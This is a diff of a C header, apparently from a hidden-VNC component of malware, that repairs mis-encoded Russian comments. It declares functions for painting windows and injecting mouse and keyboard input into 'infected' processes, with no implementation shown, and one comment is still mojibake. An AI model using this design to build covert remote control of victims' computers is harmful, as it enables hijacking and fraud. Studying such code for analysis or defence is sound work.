@@ -1,5 +1,5 @@
 /*
-  Р’РЅСѓС‚СЂРёРЅРЅРё РґР°РЅРЅС‹Рµ VNC.
+  Внутринни данные VNC.
 */
 #pragma once
 
@@ -33,7 +33,7 @@ enum
   WCF_PAINTMETHOD_PAINT       = 0x02, //Interception BeginPaint / EndPaint etc.
   WCF_PAINTMETHOD_PRINT       = 0x04, //WM_PRINT.
   WCF_PAINTMETHOD_PRINTWINDOW = 0x08, //PrintWindow.
-  WCF_PAINTMETHOD_SKIP_HOOK   = 0x10, //Р СњР Вµ Р Р†РЎвЂ№Р В·РЎвЂ№Р Р†Р В°РЎвЂљ РЎвЂЎР ВµРЎР‚Р ВµР В· VNCPROCESSDATA.vncMessage.
+  WCF_PAINTMETHOD_SKIP_HOOK   = 0x10, //РќРµ РІС‹Р·С‹РІР°С‚ С‡РµСЂРµР· VNCPROCESSDATA.vncMessage.
 
   WCF_MOUSE_CLIENT_TO_SCREEN  = 0x20, //Send all mouse messages with coordinates otnostelno screen.
   WCF_MOUSE_AUTOCAPTURE       = 0x40, //Automatically exchange SetCapture hover myshy hit the window.
@@ -130,73 +130,73 @@ extern VNCPROCESSDATA vncActiveProcessData;
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Р РёСЃРѕРІР°РЅРёРµ РґРµРєСЃС‚РѕРїР°.
+  Рисование декстопа.
 
   IN vncProcessData - VNCPROCESSDATA.
 */
 void paintDesktop(VNCPROCESSDATA *vncProcessData);
 
 /*
-  Р РёСЃРѕРІР°РЅРёРµ РѕРєРЅР°.
+  Рисование окна.
   
   IN vncProcessData - VNCPROCESSDATA.
-  IN window         - РѕРєРЅРѕ РґР»СЏ РїРµС‡Р°С‚Рё.
-  IN visibleRect    - РІРёРґРёРјР°СЏ РѕР±Р»Р°СЃС‚СЊ РґР»СЏ РѕРєРЅР°.
-  IN isServer       - true - С„СѓРЅРєС†РёСЏ РІС‹Р·РІР°РЅР° СЃ СЃРµСЂРІРµСЂР°,
-                      false - С„СѓРЅРєС†РёСЏ РІС‹Р·РІР°РЅР° СЃ Р·Р°СЂР°Р¶РµРЅРЅРѕРіРѕ РїСЂРѕС†РµСЃСЃР°.
+  IN window         - окно для печати.
+  IN visibleRect    - видимая область для окна.
+  IN isServer       - true - функция вызвана с сервера,
+                      false - функция вызвана с зараженного процесса.
   
-  Return            - true - РѕРєРЅРѕ РЅР°СЂРёСЃРѕРІР°РЅРѕ/РїСЂРѕРїСѓС‰РµРЅРѕ,
-                      false - РѕРєРЅРѕ РЅРµ РЅР°СЂРёСЃРѕРІР°РЅРѕ.
+  Return            - true - окно нарисовано/пропущено,
+                      false - окно не нарисовано.
 */
 bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibleRect, bool isServer);
 
 /*
-  РћР±СЂР°Р±РѕС‚РєР° СЃРѕРѕР±С‰РµРЅРёР№ РјС‹С€Рё.
+  Обработка сообщений мыши.
 
   IN vncProcessData - VNCPROCESSDATA.
   IN flags          - Rfb::MOUSEEVENTF_*.
   IN x              - X.
   IN y              - Y.
-  IN data           - РґРѕРїРѕР»СЊРЅРёС‚РµР»СЊРЅС‹Рµ РґР°РЅРЅС‹Рµ, СЃРѕРіР»Р°СЃРЅРѕ РїСЂРѕС‚РѕРєРѕР»Сѓ RFB.
+  IN data           - допольнительные данные, согласно протоколу RFB.
 */
 void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, DWORD data);
 
 /*
-  РћР±СЂР°Р±РѕС‚РєР° СЃРѕРѕР±С‰РµРЅРёР№ РєР»Р°РІРёР°С‚СѓСЂС‹.
+  Обработка сообщений клавиатуры.
 
   IN vncProcessData - VNCPROCESSDATA.
   IN keySym         - KeySym.
-  IN down           - true - РЅР°Р¶Р°С‚РёРµ, false - РѕС‚РїСЃСѓРєР°РЅРёРµ.
+  IN down           - true - нажатие, false - отпсукание.
 */
 void keyboardMessage(VNCPROCESSDATA *vncProcessData, DWORD keySym, bool down);
 
 /*
-  РћР±РЅРѕРІР»РµРЅРёРµ СЃРѕСЃС‚РѕСЏРЅРёРµ РєРЅРѕРїРѕРє РјС‹С€Рё Рё РєР»Р°РІРёР°С‚СѓСЂС‹.
+  Обновление состояние кнопок мыши и клавиатуры.
 
   IN OUT vncProcessData - VNCPROCESSDATA.
-  IN virtualKey         - РєР»Р°РІРёС€Р° РґР»СЏ РёР·РјРµРЅРµРЅРёСЏ, 0 - РµСЃР»Рё РЅРµ С‡РµРіРѕ РёР·РјРµРЅСЏС‚СЊ РЅРµ РЅСѓР¶РЅРѕ.
-  IN down               - true - РЅР°Р¶Р°С‚СЊ РєР»Р°РІРёС€Сѓ, false - РѕС‚РїСѓСЃС‚РёС‚СЊ РєР»Р°РІРёС€Сѓ.
+  IN virtualKey         - клавиша для изменения, 0 - если не чего изменять не нужно.
+  IN down               - true - нажать клавишу, false - отпустить клавишу.
 
-  Return                - С‚РµРєСѓС‰Р°СЏ РјР°СЃРєР° MK_* РґР»СЏ РјС‹С€РёРЅС‹С… СЃРѕРѕР±С‰РµРЅРёР№.
+  Return                - текущая маска MK_* для мышиных сообщений.
 */
 WORD updateInputState(VNCPROCESSDATA *vncProcessData, BYTE virtualKey, bool down);
 
 /*
-  Р’С‹Р±РёСЂР°РµРј РјРµС‚РѕРґ СЂРёСЃРѕРІР°РЅРёСЏ РѕРєРЅР°.
+  Выбираем метод рисования окна.
 
-  IN window - РѕРєРЅРѕ.
+  IN window - окно.
 
   Return - PWM_*.
 */
 WORD getWindowClassFlags(HWND window);
 
-/*Р’В Р’В Inifitsirovan checks whether the process window.
+/*В В Inifitsirovan checks whether the process window.
 
-Р’В Р’В IN vncProcessData - VNCPROCESSDATA.
-Р’В Р’В IN window - the window.
+В В IN vncProcessData - VNCPROCESSDATA.
+В В IN window - the window.
 
-Р’В Р’В Return - true - inifitsirovan,
-Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В false - do not inifitsirovan.*/
+В В Return - true - inifitsirovan,
+В В В В В В В В В В В В В В В В В В В В В В false - do not inifitsirovan.*/
 bool isWindowInfected(VNCPROCESSDATA *vncProcessData, HWND window);
 
 #endif
